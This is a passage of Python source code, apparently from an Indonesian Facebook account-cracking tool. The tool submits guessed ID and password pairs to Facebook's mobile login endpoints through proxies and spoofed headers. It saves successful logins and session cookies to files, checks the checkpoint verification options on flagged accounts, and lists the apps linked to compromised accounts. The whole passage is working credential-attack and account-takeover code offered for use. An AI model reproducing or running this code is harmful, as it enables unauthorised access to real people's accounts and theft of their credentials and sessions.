			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AOREC-XD CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] \x1b[38;5;226mopshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] \x1b[38;5;226mopshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/X-CRACK-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	try:os.system('screenfetch -A  SparkyLinux')
	except:pass
	time.sleep(3)
	login()